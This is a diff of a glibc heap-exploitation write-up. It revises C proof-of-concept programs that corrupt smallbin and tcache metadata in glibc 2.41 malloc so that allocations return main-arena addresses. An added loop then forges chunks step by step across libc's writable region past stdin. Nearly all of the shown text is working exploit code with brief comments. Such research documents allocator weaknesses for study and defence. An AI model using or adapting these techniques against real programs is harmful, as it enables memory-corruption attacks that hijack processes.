@@ -337,6 +337,7 @@ This has been linked and tested against glibc 2.41 , the assertion passes
 int main(int argc, char * argv[]){
 	//the smallbin chunk we will overwrite the bk of
 	char *victim = malloc(0x510);
+	char *tcache = (char*)victim - 0x290;
 	//to avoid consolidation with top
 	char *guard = malloc(0x1000);
 	//put victim in unsorted bin
@@ -344,15 +345,23 @@ int main(int argc, char * argv[]){
 	//allocate a chunk that will be cut from victim
 	//the size of the remainder is 0x110(with metadata)
 	char *trim_victim = malloc(0x400);
+
 	//update victim to reflect the trim
 	victim =  trim_victim + 0x410;
 	//the victim including metadata
 	char **victim_chunk = (char **)victim-2;
 
+	//the chunk we will overwrite in its tcache entry
+	//its entry is the one immediately following the one
+	//corresponding to victim size
+	char *tcache_target = malloc(0x110);
+	tcache += 0x80 + (int)(0x110/0x10 - 1 )*8 ;
 	//sort victim into the small bin
 	//this progression bypasses filling the tcache
 	//so 6 less allocations
-	void *sort = malloc(0x1000);
+	void *p2 = malloc(0x1000);
+	//putting tcache_target in tcache
+	free(tcache_target);
 
 	//keep the address of the smallbin for later sanity check
 	char *smallbin = victim_chunk[2];
@@ -367,7 +376,6 @@ int main(int argc, char * argv[]){
 	//to bypass the smallbin fd check
 	freelist[0][2] = (char *) victim_chunk;
 
-	char *tcache = (char*)victim_chunk - 0x6a0+0x108;
 
 	//the address of the smallbin will be written to
 	//(freelist[6]->bk)->fd
@@ -379,14 +387,12 @@ int main(int argc, char * argv[]){
 
 	//this allocates victim and starts filling tcache with chunks from
 	//our freelist
-	char *trigger = malloc(0x100);
-	char *alloc1 = malloc(0x100);
+	char *p3 = malloc(0x100);
 	//this allocates the smallbin address
-	char **alloc2 = malloc(0x100);
-	assert((long)alloc2 == (long)smallbin);
+	char **p5 = malloc(0x110);
+	assert((long)p5 == (long)smallbin);
 	exit(0);
 }
-
 
 V.3 - V2
 
@@ -414,6 +420,7 @@ int main(int argc, char * argv[]){
 	char *target =(char *)target_chunk+0x10;
 	//the smallbin chunk we will overwrite the bk of
 	char *victim = malloc(0x510);
+	char *tcache = (char*)victim - 0x290;
 	//to avoid consolidation with top
 	char *guard = malloc(0x1000);
 	//put victim in unsorted bin
@@ -425,10 +432,18 @@ int main(int argc, char * argv[]){
 	victim =  trim_victim + 0x410;
 	//the victim including metadata
 	char **victim_chunk = (char **)victim-2;
+	//the chunk we will overwrite in its tcache entry
+	//its entry is the one immediately following the one
+	//corresponding to victim size
+	char *tcache_target = malloc(0x110);
+	tcache += 0x80 + (int)(0x110/0x10 - 1 )*8 ;
+
 	//sort victim into the small bin
 	//this progression bypasses filling the tcache
 	//so 6 less allocations
 	void *sort = malloc(0x1000);
+	//putting tcache_target in tcache
+	free(tcache_target);
 	//keep the address of the smallbin for later sanity check
 	char *smallbin = victim_chunk[2];
 
@@ -444,8 +459,6 @@ int main(int argc, char * argv[]){
 	//make target the 7th chunk in the fake freelist
 	freelist[5][3] = (char *) target_chunk;
 
-	char *tcache = (char*)victim_chunk - 0x6a0+0x108;
-
 	//the address of the smallbin will be written to (target->bk)->fd
 	target_chunk[3] = (void*)tcache-0x10;
 
@@ -456,12 +469,11 @@ int main(int argc, char * argv[]){
 	//this allocates victim and starts filling tcache with chunks from
 	//our freelist
 	char *trigger = malloc(0x100);
-	//this allocates target from the head of tcache and puts
-	//the SmallBin address as the head
+	//this allocates target
 	char *alloc1 = malloc(0x100);
 	assert((long)alloc1 == (long)target);
 	//this allocates the smallbin address
-	char **alloc2 = malloc(0x100);
+	char *alloc2 = malloc(0x110);
 	assert((long)alloc2 == (long)smallbin);
 	exit(0);
 }
@@ -521,21 +533,48 @@ Smoke, now we can simply :
 
 As a proof of concept, add these lines to one of the PoCs above:
 
+	//now we assume the attacker can read from alloc2 an address of libc
+	//this is why this require both read and write capability
+	//
 	//get the address of the eith bin forward
-	char **bin2 = alloc2 + 2*8;
-	//simulate a write
-	alloc2[0] = alloc2[1] = (char *) bin2;
-	alloc2[16] = alloc2[17] =(char *) 0x100;
-	alloc2[18] = alloc2[19] = (char *) alloc2-0x10;
-	char *alloc3 = malloc(0xf0);
-	assert((long)alloc3 == (long)bin2+0x10);
+	char **bin2 = alloc2;
+	char **bin1 = alloc2;
+	char *alloc3 = NULL;
+	//make sure we started before stdout
+	assert((long)alloc2 < (long) stdout);
+	char *backup[4];
+	while ((void *)alloc3 < (void *)stdin + 0x300){
+		bin2 += 28;
+		//simulate a write
+		//fake links of current bin to point to the next allocated one
+		bin1[0] = bin1[1] = (char *) bin2;
+		//backup bin2 contents to restore them and avoid crashes
+		//we are overwriting ciritical libc data with our fake
+		//chunk , this goes with the assumption that the attacker can
+		//read/write to malloced chunks , and bin2 chunk is entirely
+		//within either bin1 or alloc3 , so no hidden dependencies
+		for (int j = 0 ; j < 4 ; j++){
+			backup[j] = bin2[j];
+		}
+		//fake sizes
+		bin2[0] = bin2[1] = (char *) 0x100;
+		//fake links of the next bin to point to point to current bin
+		bin2[2] = bin2[3] = (char *) bin1-0x10;
+		alloc3 = malloc(0xf0);
+		assert((long)alloc3 == (long)bin2+0x10);
+		//restore state
+		for (int j = 0 ; j < 4 ; j++){
+			bin2[j] = backup[j];
+		}
+		
+	}
+	//by now we reached beyond stdin+0x300 , which is not far off the
+	//end of libc writable region
 	exit(0);
 
-The assert passes; now we can write a fake chunk even further, and
-eventually we can modify the IO structures and everything that is writable,
-after the main arena!
-Imagine how much fun one can have with that.
 
+This allows an attacker to "expand" in the writable libc region after the 
+main arena.
 VIII - Conclusion
 
 As you can see, there is a lot of Fun that could be had with this,
